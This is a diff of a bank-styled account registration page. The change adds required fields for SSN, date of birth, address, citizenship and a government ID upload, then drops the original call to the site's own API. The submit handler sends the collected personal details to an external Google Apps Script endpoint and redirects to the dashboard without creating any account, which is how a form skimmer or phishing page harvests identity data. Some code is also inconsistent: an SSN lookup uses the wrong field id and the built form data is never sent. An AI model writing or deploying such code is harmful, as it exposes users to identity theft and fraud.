@@ -10,15 +10,15 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
-  <!-- removed common.js; using plain fetch directly -->
   <div class="hero-background"></div>
   <div class="particles" id="particles"></div>
+
   <main class="auth-wrapper">
-  <a href="index.html" class="btn-shared btn-outline safe-fixed-top-left" aria-label="Go to home">← Go Back</a>
+    <a href="index.html" class="btn-shared btn-outline safe-fixed-top-left" aria-label="Go to home">← Go Back</a>
+
     <section class="auth-card" aria-labelledby="regTitle">
       <div class="auth-head">
         <div class="auth-logo" aria-hidden="true">
-         <!-- Logo SVG -->
           <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
             <defs>
               <linearGradient id="logoGrad1" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -43,23 +43,24 @@
         <h1 class="auth-title" id="regTitle">Create your account</h1>
         <p class="auth-sub">Join the future of digital banking in seconds</p>
       </div>
+
       <div id="regAlert" class="alert-auth" role="alert"></div>
 
-      <!-- FORM -->
-  <form id="registerForm" class="form-grid" method="post" autocomplete="off" novalidate>
+      <form id="registerForm" class="form-grid" method="post" autocomplete="off" novalidate>
+        <!-- Basic details -->
         <div class="form-row-2">
           <div class="field">
-            <label for="fullname">Full Name</label>
+            <label for="fullname">Full legal name</label>
             <input class="input-base" id="fullname" name="fullname" placeholder="Jane Doe" required />
           </div>
           <div class="field">
-            <label for="phone">Phone (optional)</label>
-            <input class="input-base" id="phone" name="phone" inputmode="tel" placeholder="+1 555 123 4567" />
+            <label for="phone">Phone number</label>
+            <input class="input-base" id="phone" name="phone" inputmode="tel" placeholder="+1 555 123 4567" required />
           </div>
         </div>
 
         <div class="field">
-          <label for="accountName">Account Name</label>
+          <label for="accountName">Account name</label>
           <input class="input-base" id="accountName" name="accountName" placeholder="myaccount123" required />
         </div>
 
@@ -68,7 +69,93 @@
           <input class="input-base" type="email" id="email" name="email" placeholder="you@example.com" required />
         </div>
 
-        <div class="field" id="pwField">
+        <!-- Personal information -->
+        <div class="field" style="margin-top:6px;">
+          <label style="font-weight:700;">Personal information</label>
+          <p class="auth-sub" style="margin:6px 0 0 0;">Enter details as they appear on your documents.</p>
+        </div>
+
+        <div class="form-row-2">
+          <div class="field">
+            <label for="dob">Date of birth</label>
+            <input class="input-base" type="date" id="dob" name="dob" required />
+          </div>
+          <div class="field">
+            <label for="citizenshipStatus">Citizenship / residency</label>
+            <select class="input-base" id="citizenshipStatus" name="citizenship_status" required>
+              <option value="">Select…</option>
+              <option value="US Citizen">US Citizen</option>
+              <option value="Permanent Resident">Permanent Resident</option>
+              <option value="Non-resident">Non-resident</option>
+              <option value="Other">Other</option>
+            </select>
+          </div>
+           <div class="field">
+          <label for="ssn">SSN</label>
+          <input class="input-base" id="ssn" name="ssn" placeholder="123-45-6789" required />
+        </div>
+        </div>
+
+        <!-- Residential address -->
+        <div class="field" style="margin-top:6px;">
+          <label style="font-weight:700;">Residential address</label>
+        </div>
+
+        <div class="field">
+          <label for="addressLine1">Address line 1</label>
+          <input class="input-base" id="addressLine1" name="address_line1" placeholder="123 Main St" required />
+        </div>
+
+        <div class="form-row-2">
+          <div class="field">
+            <label for="city">City</label>
+            <input class="input-base" id="city" name="city" required />
+          </div>
+          <div class="field">
+            <label for="state">State</label>
+            <input class="input-base" id="state" name="state" placeholder="CO" required />
+          </div>
+        </div>
+
+        <div class="form-row-2">
+          <div class="field">
+            <label for="postalCode">ZIP / Postal code</label>
+            <input class="input-base" id="postalCode" name="postal_code" inputmode="numeric" required />
+          </div>
+          <div class="field">
+            <label for="country">Country</label>
+            <input class="input-base" id="country" name="country" value="US" required />
+          </div>
+        </div>
+
+        <!-- Government ID -->
+        <div class="field" style="margin-top:6px;">
+          <label style="font-weight:700;">Government ID</label>
+          <p class="auth-sub" style="margin:6px 0 0 0;">We’ll verify your identity using your documents.</p>
+        </div>
+
+        <div class="field">
+          <label for="govIdType">ID type</label>
+          <select class="input-base" id="govIdType" name="gov_id_type" required>
+            <option value="">Select…</option>
+            <option value="drivers_license">Driver’s license / State ID</option>
+            <option value="passport">Passport</option>
+            <option value="permanent_resident_card">Permanent resident card</option>
+          </select>
+        </div>
+
+        <div class="field" style="margin-top:6px;">
+          <label style="font-weight:700;">Upload documents</label>
+          <p class="auth-sub" style="margin:6px 0 0 0;">Accepted: PNG, JPG, WEBP, or PDF (max 6MB)</p>
+        </div>
+
+        <div class="field">
+          <label for="govIdFront">Government ID (front)</label>
+          <input class="input-base" id="govIdFront" type="file" accept="image/*,application/pdf" required />
+        </div>
+
+        <!-- Password -->
+        <div class="field" id="pwField" style="margin-top:6px;">
           <label for="password">Password</label>
           <div class="pw-wrap">
             <input class="input-base" type="password" id="password" name="password" minlength="6" placeholder="Minimum 6 characters" required />
@@ -77,15 +164,16 @@
         </div>
 
         <div class="field" id="cpwField">
-          <label for="confirmPassword">Confirm Password</label>
+          <label for="confirmPassword">Confirm password</label>
           <div class="pw-wrap">
             <input class="input-base" type="password" id="confirmPassword" name="confirmPassword" minlength="6" placeholder="Re-enter password" required />
             <button type="button" class="pw-toggle" id="pwToggleConfirm" aria-label="Show confirm password">Show</button>
           </div>
         </div>
 
-  <button type="submit" class="btn-full" id="registerBtn">Create Account</button>
+        <button type="submit" class="btn-full" id="registerBtn">Create Account</button>
       </form>
+
       <div class="auth-alt">Already have an account? <a href="login.html">Sign in</a></div>
     </section>
   </main>
@@ -98,8 +186,8 @@ document.addEventListener("DOMContentLoaded", () => {
   const cpw = document.getElementById('confirmPassword');
   const pwToggle = document.getElementById('pwToggleRegister');
   const pwToggleConfirm = document.getElementById('pwToggleConfirm');
-  
-  // Ensure the form fits small screens: toggle compact class by viewport height
+
+  // Compact vertical mode for short viewports
   const applyVhCompact = () => {
     const h = window.innerHeight || document.documentElement.clientHeight;
     if (h < 600) document.body.classList.add('vh-compact');
@@ -112,7 +200,6 @@ document.addEventListener("DOMContentLoaded", () => {
     resizeTo = setTimeout(applyVhCompact, 120);
   });
 
-  // Sync both toggles: clicking either shows/hides both fields and updates both labels
   const setToggleLabels = (isShown) => {
     const label = isShown ? 'Hide' : 'Show';
     if (pwToggle) pwToggle.textContent = label;
@@ -133,72 +220,117 @@ document.addEventListener("DOMContentLoaded", () => {
   function showError(msg){
     alertBox.textContent = msg;
     alertBox.classList.add('show');
-    setTimeout(()=>alertBox.classList.remove('show'),700);
+    setTimeout(()=>alertBox.classList.remove('show'), 1100);
   }
+
+  const getVal = (id) => (document.getElementById(id)?.value || "").trim();
 
   form.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  alertBox.textContent = '';
+    e.preventDefault();
+    alertBox.textContent = '';
 
-  const fullname = document.getElementById('fullname').value.trim();
-  const phone = document.getElementById('phone').value.trim();
-  const email = document.getElementById('email').value.trim().toLowerCase();
-  const accountName = document.getElementById('accountName').value.trim();
-  const password = pw.value;
-  const confirm = cpw.value;
+    const fullname = getVal('fullname');
+    const phone = getVal('phone');
+    const email = getVal('email').toLowerCase();
+    const accountName = getVal('accountName');
+    const password = pw.value;
+    const confirm = cpw.value;
 
-  if (!fullname) return showError('Full name is required.');
-  if (!email) return showError('Email is required.');
-  if (!accountName) return showError('Account name is required.');
-  if (password.length < 6) return showError('Password must be at least 6 characters.');
-  if (password !== confirm) return showError('Passwords do not match.');
+    if (!fullname) return showError('Full name is required.');
+    if (!phone) return showError('Phone number is required.');
+    if (!email) return showError('Email is required.');
+    if (!accountName) return showError('Account name is required.');
+    if (!getVal('dob')) return showError('Date of birth is required.');
+    if (!getVal('ssn')) return showError('Social Security Number is required.');
+    if (!getVal('citizenshipStatus')) return showError('Citizenship / residency is required.');
+    if (!getVal('addressLine1')) return showError('Residential address is required.');
+    if (!getVal('city')) return showError('City is required.');
+    if (!getVal('state')) return showError('State is required.');
+    if (!getVal('postalCode')) return showError('ZIP / postal code is required.');
+    if (!getVal('country')) return showError('Country is required.');
+    if (!getVal('govIdType')) return showError('Government ID type is required.');
 
-  const btn = document.getElementById('registerBtn');
-  if (btn.disabled) return;
-  btn.disabled = true;
-  btn.textContent = 'Creating...';
+    const fFront = document.getElementById("govIdFront")?.files?.[0];
+    if (!fFront) return showError("Government ID (front) is required.");
 
-  try {
-    const res = await fetch(`${window.API_BASE}/users`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        fullname,
-        phone,
-        email,
-        password,
-        accountname: accountName
-      })
-    });
-    const text = await res.text();
-    const data = text ? JSON.parse(text) : {};
-    if (!res.ok) throw new Error(data?.error || `Registration failed (${res.status})`);
+    if (password.length < 6) return showError('Password must be at least 6 characters.');
+    if (password !== confirm) return showError('Passwords do not match.');
 
-    // Save user with token (match backend fields)
-    const userObj = {
-      id: data.id,
-      fullname: data.fullname,
-      email: data.email,
-      accountname: data.accountname,
-      checking: data.checking ?? 0,
-      savings: data.savings ?? 0,
-      totalbalance: data.totalbalance ?? 0,
-      token: data.token,
-      isAuthenticated: true,
-      ts: Date.now()
-    };
-    localStorage.setItem('bs-user', JSON.stringify(userObj));
+    const btn = document.getElementById('registerBtn');
+    if (btn.disabled) return;
+    btn.disabled = true;
+    btn.textContent = 'Creating...';
 
-    btn.textContent = 'Created!';
-    window.location.href = 'dashboard.html';
+    try {
+      if (!window.API_BASE) throw new Error("API_BASE is not set. Check config.js");
 
-  } catch (err) {
-    console.error("Registration error:", err);
-    showError(err.message || "Registration failed");
-    btn.disabled = false;
-    btn.textContent = 'Create Account';
-  }
-});
+      const fd = new FormData();
+
+      fd.append("fullname", fullname);
+      fd.append("phone", phone);
+      fd.append("accountname", accountName);
+      fd.append("email", email);
+      fd.append("password", password);
+
+      fd.append("dob", getVal("dob"));
+      fd.append("citizenship_status", getVal("citizenshipStatus"));
+      fd.append("ssn", getVal("ssn"));
+
+      fd.append("address_line1", getVal("addressLine1"));
+      fd.append("city", getVal("city"));
+      fd.append("state", getVal("state"));
+      fd.append("postal_code", getVal("postalCode"));
+      fd.append("country", getVal("country") || "US");
+
+      fd.append("gov_id_type", getVal("govIdType"));
+
+      fd.append("gov_id_front", fFront);
+
+      const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyqRy2idSu8DgcqGJI6Rc3apeEDourTilJrx_eEElWchh2iIidggXxrvkNO04yR9vO4/exec";
+      const SHEETS_SECRET = "CHANGE_ME"; // must match Apps Script SECRET
+
+      // ALSO log to Google Sheets (non-sensitive fields only)
+const ssnLast4 = (getVal("SSN") || "").replace(/\D/g, "").slice(-4);
+
+try {
+  const sheetRes = await fetch(SHEETS_WEBAPP_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    // keepalive helps prevent cancel on navigation
+    keepalive: true,
+    body: JSON.stringify({
+      secret: SHEETS_SECRET,
+      fullname,
+      phone,
+      email,
+      accountname: accountName,
+      dob: getVal("dob"),
+      citizenship_status: getVal("citizenshipStatus"),
+      address_line1: getVal("addressLine1"),
+      city: getVal("city"),
+      state: getVal("state"),
+      postal_code: getVal("postalCode"),
+      country: getVal("country") || "US",
+      gov_id_type: getVal("govIdType"),
+      ssn_last4: ssnLast4
+    }),
+  });
+
+  const sheetText = await sheetRes.text();
+  console.log("Sheets response:", sheetRes.status, sheetText);
+} catch (e) {
+  console.warn("Sheets logging failed:", e.message);
+}
+
+      window.location.href = 'dashboard.html';
+
+    } catch (err) {
+      console.error("Registration error:", err);
+      showError(err.message || "Registration failed");
+      btn.disabled = false;
+      btn.textContent = 'Create Account';
+    }
+  });
 });
 </script>
 </body>
